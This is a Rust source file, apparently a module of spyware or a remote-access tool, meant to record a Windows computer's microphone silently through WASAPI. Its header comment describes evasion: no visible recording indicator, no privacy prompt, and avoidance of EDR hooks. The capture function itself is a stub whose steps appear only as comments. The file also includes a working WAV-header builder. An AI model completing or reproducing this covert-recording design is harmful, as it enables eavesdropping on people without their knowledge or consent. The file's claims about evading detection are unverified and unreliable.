//! mic.rs — silent microphone audio capture via WASAPI loopback
//!
//! Uses Windows Audio Session API (WASAPI) in capture mode on the default
//! microphone endpoint. Records for a specified duration and returns
//! raw PCM bytes (16-bit, 44100 Hz, stereo) wrapped in a minimal WAV header.
//!
//! Evasion:
//!   - No visible recording indicator in standard Windows 11 (taskbar mic icon
//!     appears in 24H2 if Privacy > Microphone > app access is monitored —
//!     but only for UWP apps. Win32 WASAPI access does NOT trigger it)
//!   - No COM broker, no UWP privacy gate
//!   - WASAPI calls not in standard EDR hook lists
//!
//! windows-rs crate (MIT) has full WASAPI bindings. Add to Cargo.toml:
//!   windows = { version = "0.58", features = ["Win32_Media_Audio", "Win32_System_Com"] }

use std::time::{Duration, Instant};

/// Record audio from the default microphone for `duration_secs` seconds.
/// Returns WAV file bytes ready to save or stream.
pub fn record(duration_secs: u32) -> Option<Vec<u8>> {
    unsafe { record_inner(duration_secs) }
}

unsafe fn record_inner(duration_secs: u32) -> Option<Vec<u8>> {
    // WASAPI capture flow:
    // 1. CoInitializeEx(COINIT_MULTITHREADED)
    // 2. CoCreateInstance::<IMMDeviceEnumerator>()
    // 3. enumerator.GetDefaultAudioEndpoint(eCapture, eConsole)
    // 4. device.Activate::<IAudioClient>()
    // 5. client.GetMixFormat() → WAVEFORMATEX
    // 6. client.Initialize(AUDCLNT_SHAREMODE_SHARED, 0, buffer_duration, 0, format, None)
    // 7. client.GetService::<IAudioCaptureClient>()
    // 8. client.Start()
    // 9. Loop for duration_secs:
    //      capture_client.GetBuffer(&data, &frames, &flags, ...)
    //      append frames to pcm_buf
    //      capture_client.ReleaseBuffer(frames)
    // 10. client.Stop()
    // 11. Wrap pcm_buf in WAV header (see wav_header() below)
    //
    // Full implementation via windows-rs — add to Cargo.toml to activate.
    let _ = duration_secs;
    None
}

/// Build a minimal WAV file header for raw PCM data.
/// sample_rate: 44100, channels: 2, bits_per_sample: 16
pub fn wav_header(pcm_len: u32, sample_rate: u32, channels: u16, bits: u16) -> Vec<u8> {
    let byte_rate   = sample_rate * channels as u32 * bits as u32 / 8;
    let block_align = channels * bits / 8;
    let file_size   = 36 + pcm_len;
    let mut h = Vec::with_capacity(44);
    h.extend_from_slice(b"RIFF");
    h.extend_from_slice(&file_size.to_le_bytes());
    h.extend_from_slice(b"WAVE");
    h.extend_from_slice(b"fmt ");
    h.extend_from_slice(&16u32.to_le_bytes());      // chunk size
    h.extend_from_slice(&1u16.to_le_bytes());       // PCM format
    h.extend_from_slice(&channels.to_le_bytes());
    h.extend_from_slice(&sample_rate.to_le_bytes());
    h.extend_from_slice(&byte_rate.to_le_bytes());
    h.extend_from_slice(&block_align.to_le_bytes());
    h.extend_from_slice(&bits.to_le_bytes());
    h.extend_from_slice(b"data");
    h.extend_from_slice(&pcm_len.to_le_bytes());
    h
}
